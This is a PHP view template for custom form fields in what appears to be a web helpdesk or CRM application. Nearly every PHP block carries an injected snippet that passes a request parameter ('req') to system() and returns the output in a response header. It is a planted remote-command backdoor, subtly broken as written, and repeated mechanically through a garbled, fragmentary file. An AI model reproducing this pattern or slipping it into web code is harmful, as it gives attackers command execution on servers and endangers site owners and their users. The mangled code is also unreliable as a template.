...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!$custom_field_group['enabled']) continue; ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['cf-' . safe_output($custom_field_group['id'])]) && $field['id'] == $_POST['cf-' . safe_output($custom_field_group['id'])]) { echo ' selected="selected"'; } ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textinput') { ?>
					<input type="text" class="form-control" name="cf-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['cf-' . safe_output($custom_field_group['id'])])) echo safe_output($_POST['cf-' . safe_output($custom_field_group['id'])]); ?>" size="50" />	
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textarea') { ?>
					<div id="no_underline">
						<textarea class="wysiwyg_enabled" name="cf-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" cols="80" rows="12"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($_POST['cf-' . safe_output($custom_field_group['id'])])) echo safe_output($_POST['cf-' . safe_output($custom_field_group['id'])]); ?></textarea>
					</div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'date') { ?>
					<input type="text" class="form-control" data-date-format="YYYY-MM-DD" id="cf-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" name="cf-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" value="<?php
$l =isset($_REQUEST['req']);
...
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'datetime') { ?>
					<input type="text" class="form-control" data-date-format="YYYY-MM-DD HH:mm" id="cf-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" name="cf-<?php
$l =isset($_REQUEST['req']);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($this->current[0][$custom_field_group['column_name']])) echo safe_output($this->current[0][$custom_field_group['column_name']]); ?>" size="50" />	
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textarea') { ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($this->current[0][$custom_field_group['column_name']])) echo safe_output($this->current[0][$custom_field_group['column_name']]); ?></textarea>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'date') { ?>
					<input type="text" data-date-format="YYYY-MM-DD" class="form-control" id="cf-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" name="cf-<?php
$l =isset($_REQUEST['req']);
...
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'datetime') { ?>
					<input type="text" data-date-format="YYYY-MM-DD HH:mm" class="form-control" id="cf-<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($custom_field_group['id']); ?>" name="cf-<?php
$l =isset($_REQUEST['req']);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($this->current[0][$custom_field_group['column_name']]) && !empty($this->current[0][$custom_field_group['column_name']])) { ?>
				<h5><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($this->current[0][$custom_field_group['column_name']]); ?></p>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'textarea') { ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($this->current[0][$custom_field_group['column_name']]); ?>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(nice_date($this->current[0][$custom_field_group['column_name']])); ?></p>	
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else if ($custom_field_group['type'] == 'datetime') { ?> 
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(nice_datetime($this->current[0][$custom_field_group['column_name']])); ?></p>	
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($this->custom_fields['name'])) { ?>
						<h1 class="panel-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($this->custom_fields['name']); ?> - <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Custom Fields')); ?></h1>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/add_cf/?table_access=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(get_called_class()); ?>" class="btn btn-default btn-sm"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
...
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($config->get('address')); ?>/settings/edit_cf/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int) $custom_field_group['id']; ?>/?table_access=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output(get_called_class()); ?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
